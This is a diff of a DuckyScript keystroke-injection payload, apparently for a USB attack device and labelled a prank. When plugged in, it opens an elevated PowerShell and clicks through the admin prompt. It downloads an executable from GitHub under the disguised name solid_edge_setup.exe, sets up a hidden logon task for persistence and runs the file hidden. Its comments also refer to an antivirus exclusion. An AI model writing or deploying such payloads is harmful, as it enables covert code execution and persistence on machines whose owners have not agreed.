@@ -1,9 +1,11 @@
+REM Close the storage window when the payload starts
+ALT F4
 REM Open Powershell admin
 GUI r
 DELAY  1000
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY  1000
+DELAY  2000
 TAB
 TAB
 ENTER
@@ -14,6 +16,8 @@ ENTER
 DELAY  1000 
 REM Get file from github
 STRING cd $env:APPDATA
+ENTER
+DELAY  1000 
 REM Another option would be to do net webClient
 REM $webClient = New-Object System.Net.WebClient
 REM $webClient.DownloadFile("https://github.com/TimothyBaalman/pranks/raw/main/dist/random_mouse.exe", "$env:APPDATA\solid_edge_setup.exe")
@@ -21,10 +25,10 @@ STRING Invoke-WebRequest -Uri "https://github.com/TimothyBaalman/pranks/raw/main
 ENTER
 DELAY  1000
 REM This script sets up a task to run a program on startup
-STRING $action = New-ScheduledTaskAction -Execute '$env:APPDATA\solid_edge_setup.exe'
+STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command & '$env:APPDATA\solid_edge_setup.exe'"
 ENTER
 DELAY  1000
-STRING $trigger = New-ScheduledTaskTrigger -AtStartup
+STRING $trigger = New-ScheduledTaskTrigger -AtLogOn
 ENTER
 DELAY  1000
 STRING $settings = New-ScheduledTaskSettingsSet
@@ -35,6 +39,12 @@ ENTER
 DELAY  1000
 REM Run the program now
 STRING Start-Process "$env:APPDATA\solid_edge_setup.exe" -WindowStyle Hidden
+ENTER
 DELAY  1000
 STRING exit
 ENTER
+REM To fix delete SolidEdgeSetupTask in task scheduler
+REM To stop current in powershell type Stop-process -Name "solid_edge_setup"
+REM Can also remove the file in called solid_edge_setup.exe
+REM Fix virus scan exclusion in powershell admin with Remove-MpPreference -ExclusionPath "$env:APPDATA\solid_edge_setup.exe" 
+REM or in Windows Security > Virus & threat protection > Virus & threat protection settings > Add or remove exclusions
